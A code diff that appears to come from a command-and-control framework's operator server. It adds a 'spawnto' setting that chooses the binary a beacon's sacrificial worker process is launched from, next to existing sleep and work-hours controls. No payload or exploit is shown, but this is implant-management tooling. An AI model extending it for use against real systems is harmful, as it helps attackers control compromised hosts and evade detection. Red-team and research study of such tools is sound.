@@ -3884,6 +3884,7 @@ class OperatorListener:
                 'alive': s.alive,
                 'viewers': others,
                 'viewer_count': len(others),
+                'spawnto': getattr(s, 'spawn_to', '') or '',
             })
 
         return jsonify(beacons)
@@ -3983,7 +3984,7 @@ class OperatorListener:
                 resp.headers['X-Audit-Id'] = audit_id
                 return resp
 
-        if verb in ('sleep', 'workhours'):
+        if verb in ('sleep', 'workhours', 'spawnto'):
             session = self.engine.get(bid)
             if session is None:
                 return Response(status=404)
@@ -5089,6 +5090,30 @@ class OperatorListener:
             session.work_hours_start = start
             session.work_hours_end = end
             return 'workhours=' + self._format_window(session)
+
+        if verb == 'spawnto':
+            if not args:
+                cur = getattr(session, 'spawn_to', '') or ''
+                return f'spawnto={cur or "<default>"}'
+            a = args[0].strip()
+            if a.lower() == 'self':
+                raise ValueError(
+                    'spawnto "self" is no longer supported. The '
+                    'sacrificial worker is always staged to a '
+                    'separate path under %LOCALAPPDATA%; spawning '
+                    'from the beacon binary itself is not '
+                    'available. Use `spawnto --clear` to revert '
+                    'to the default worker, or set an explicit '
+                    'path to another binary.')
+            if a in ('--clear', '-', ''):
+                session.spawn_to = ''
+                return 'spawnto=<default>'
+            if len(a) > 512:
+                raise ValueError('spawnto path is too long (max 512)')
+            if any(ch in a for ch in ('\n', '\r', '\0')):
+                raise ValueError('spawnto path contains control bytes')
+            session.spawn_to = a
+            return f'spawnto={a}'
 
         raise ValueError(f'not a server-side verb: {verb}')
 
